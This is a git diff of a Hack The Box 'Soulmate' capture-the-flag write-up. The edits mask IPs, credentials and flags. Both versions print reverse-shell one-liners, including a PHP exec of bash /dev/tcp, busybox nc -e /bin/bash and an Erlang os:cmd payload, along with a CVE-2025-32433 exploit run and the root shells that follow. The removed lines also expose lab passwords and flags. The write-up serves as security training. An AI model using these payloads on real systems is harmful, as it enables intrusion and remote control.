@@ -1,5 +1,6 @@
 ---
 title: Soulmate [Easy]
+published: false
 date: 2025-09-12
 tags: [htb, linux, nmap, lfi, dirsearch, cve-2025-54309, gobuster, cve-2025-31161/cve-2025-2825, php reverse shell, erlang, cve-2025-32433, hardcoded credentials]
 categories: [HTB Writeups]
@@ -15,9 +16,9 @@ Author: [kavigihan](https://app.hackthebox.com/users/389926)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.172.38                                    
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx                                    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 10:56 EDT
-Nmap scan report for 10.129.172.38
+Nmap scan report for 10.129.xx.xx
 Host is up (0.60s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -36,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 44.60 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.172.38     soulmate.htb
+10.129.xx.xx     soulmate.htb
 ```
 
 Let's check the web server.
@@ -143,7 +144,7 @@ After waiting, we found out another subdomain `ftp`. <br>
 &rarr; Add it to `/etc/hosts`.
 
 ```bash
-10.129.172.38     soulmate.htb ftp.soulmate.htb
+10.129.xx.xx     soulmate.htb ftp.soulmate.htb
 ```
 
 Go to `http://ftp.soulmate.htb`.
@@ -280,7 +281,7 @@ After changing, there will be popup for new password has been changed. <br>
 &rarr; Save it and login back as `ben`.
 
 ```bash
-Username : ben Password : XUZ77m
+Username : ben Password : XUZxxx
 ```
 
 ![Soulmate Website CrushFTP ben](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-ben.png)
@@ -303,7 +304,7 @@ We gonna craft a simple php file to execute bash shell command.
 
 ```php
 # soul.php  
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/3333 0>&1'"); ?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1'"); ?>
 ```
 
 Then we upload it.
@@ -314,7 +315,7 @@ Setup our listener.
 
 ```bash
 └─$ penelope -p 3333
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -325,13 +326,13 @@ From the upload path, we can see that it was `/webProd/soul.php` which means it 
 
 ```bash
 └─$ penelope -p 3333
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from soulmate~10.129.172.38-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from soulmate~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/soulmate~10.129.172.38-Linux-x86_64/2025_09_08-06_08_05-393.log 📜
+[+] Logging to /home/kali/.penelope/soulmate~10.129.xx.xx-Linux-x86_64/2025_09_08-06_08_05-393.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@soulmate:~/soulmate.htb/public$
 ```
@@ -390,7 +391,7 @@ class Database {
         $adminCheck->execute(['admin']);
         
         if ($adminCheck->fetchColumn() == 0) {
-            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
+            $adminPassword = password_hash('Crush4dminxxx', PASSWORD_DEFAULT);
             $adminInsert = $this->pdo->prepare("
                 INSERT INTO users (username, password, is_admin, name) 
                 VALUES (?, ?, 1, 'Administrator')
@@ -433,7 +434,7 @@ function requireAdmin() {
 ?>
 ```
 
-We found out a `config.php` that contains the password for admin &rarr; `Crush4dmin990`. <br>
+We found out a `config.php` that contains the password for admin &rarr; `Crush4dminxxx`. <br>
 &rarr; Let's login it and see what else can we do.
 
 ![Soulmate Website Admin Login](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-admin-login.png)
@@ -604,7 +605,7 @@ main(_) ->
 
         {auth_methods, "publickey,password"},
 
-        {user_passwords, [{"ben", "HouseH0ldings998"}]},
+        {user_passwords, [{"ben", "HouseH0ldingsxxx"}]},
         {idle_time, infinity},
         {max_channels, 10},
         {max_sessions, 10},
@@ -624,15 +625,15 @@ main(_) ->
 **JACKPOT!** We found a hardcoded credentials in `start.escript`.
 
 ```bash
-{user_passwords, [{"ben", "HouseH0ldings998"}]}
+{user_passwords, [{"ben", "HouseH0ldingsxxx"}]}
 ```
 
 Let's `ssh` with normal port first.
 
 ```bash
-└─$ ssh ben@10.129.127.216
-ben@10.129.127.216's password: 
-Last login: Tue Sep 9 03:40:53 2025 from 10.10.16.17
+└─$ ssh ben@10.129.xx.xx
+ben@10.129.xx.xx's password: 
+Last login: Tue Sep 9 03:40:53 2025 from 10.xx.xx.xx
 ben@soulmate:~$
 ```
 
@@ -648,7 +649,7 @@ drwx------ 2 ben  ben  4096 Sep  2 10:27 .cache
 -rw-r--r-- 1 ben  ben   807 Aug  6 10:17 .profile
 -rw-r----- 1 root ben    33 Sep  9 03:24 user.txt
 ben@soulmate:~$ cat user.txt
-2a292f69fd92952b38af8ec0f6415878
+2a292fxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab our `user.txt` flag.
@@ -687,13 +688,13 @@ First we gonna download the python script and setup our python server and then t
 Then we will escalated with these command and option.
 
 ```bash
-www-data@soulmate:/tmp$ python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.10.16.17 --lport 4444
+www-data@soulmate:/tmp$ python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.xx.xx.xx --lport 4444
 [*] Target: 127.0.0.1:2222
-[*] Sending reverse shell to connect back to 10.10.16.17:4444
+[*] Sending reverse shell to connect back to 10.xx.xx.xx:4444
 [*] Connecting to target...
 [+] Received banner: SSH-2.0-Erlang/5.2.9
 Fɍ      >\      5curve25519-sha256,curve25519-sha256@libssh.org,curve448-sha512,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com9ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256aes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbcaes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1▒none,zlib@openssh.com,zlib▒none,zlib@openssh.com,zlib
-[+] Running command: os:cmd("bash -c 'exec 5<>/dev/tcp/10.10.16.17/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'").
+[+] Running command: os:cmd("bash -c 'exec 5<>/dev/tcp/10.xx.xx.xx/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'").
 [✓] Exploit sent. If vulnerable, command should execute.
 [+] Reverse shell command sent. Check your listener.
 ```
@@ -705,36 +706,36 @@ Checking back the listener does not have any response. <br>
 We gonna update this part.
 
 ```bash
-[+] Running command: os:cmd("bash -c 'exec 5<>/dev/tcp/10.10.16.17/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'").
+[+] Running command: os:cmd("bash -c 'exec 5<>/dev/tcp/10.xx.xx.xx/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'").
 ```
 
 By using [busybox](https://gtfobins.github.io/gtfobins/busybox/) as this binary is not always restricted by other binary.
 
 ```bash
-os:cmd("busybox nc 10.10.16.17 4444 -e /bin/bash")
+os:cmd("busybox nc 10.xx.xx.xx 4444 -e /bin/bash")
 ```
 
 ### CVE-2025-32433 (modified script)
 ```bash
-www-data@soulmate:/tmp$ python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.10.16.17 --lport 4444
+www-data@soulmate:/tmp$ python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.xx.xx.xx --lport 4444
 [*] Target: 127.0.0.1:2222
-[*] Sending reverse shell to connect back to 10.10.16.17:4444
+[*] Sending reverse shell to connect back to 10.xx.xx.xx:4444
 [*] Connecting to target...
 [+] Received banner: SSH-2.0-Erlang/5.2.9
-[+] Running command: os:cmd("busybox nc 10.10.16.17 4444 -e /bin/bash").
+[+] Running command: os:cmd("busybox nc 10.xx.xx.xx 4444 -e /bin/bash").
 [✓] Exploit sent. If vulnerable, command should execute.
 [+] Reverse shell command sent. Check your listener.
 ```
 
 ```bash
 └─$ penelope -p 4444         
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from soulmate~10.129.172.38-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from soulmate~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/soulmate~10.129.172.38-Linux-x86_64/2025_09_08-06_49_57-849.log 📜
+[+] Logging to /home/kali/.penelope/soulmate~10.129.xx.xx-Linux-x86_64/2025_09_08-06_49_57-849.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 root@soulmate:/# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -761,7 +762,7 @@ lrwxrwxrwx  1 root root    9 Aug 19 12:17 .sqlite_history -> /dev/null
 drwx------  2 root root 4096 Aug  6 10:57 .ssh
 -rw-r--r--  1 root root  165 Aug 27 09:28 .wget-hsts
 root@soulmate:~# cat root.txt
-ca8e12f4dc5f672026d9a333fe592bb4
+ca8e12xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `root.txt` flag.
@@ -772,24 +773,24 @@ So that fact that escalated from `www-data` to `ben` is not much so we thinking 
 If we go from `ben` session, we can just using simple command that we can take a look at [cve-2025-32433-erlang-otp-ssh-server-rce](https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce).
 
 ```bash
-os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'").
+os:cmd("bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/4444 0>&1'").
 ```
 
 Let's run it out.
 
 ```bash
-(ssh_runner@soulmate)2> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'").
+(ssh_runner@soulmate)2> os:cmd("bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/4444 0>&1'").
 ```
 
 ```bash
 └─$ penelope -p 4444
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from soulmate~10.129.127.216-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from soulmate~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/soulmate~10.129.127.216-Linux-x86_64/2025_09_09-00_02_50-913.log 📜
+[+] Logging to /home/kali/.penelope/soulmate~10.129.xx.xx-Linux-x86_64/2025_09_09-00_02_50-913.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 root@soulmate:/#
 ```
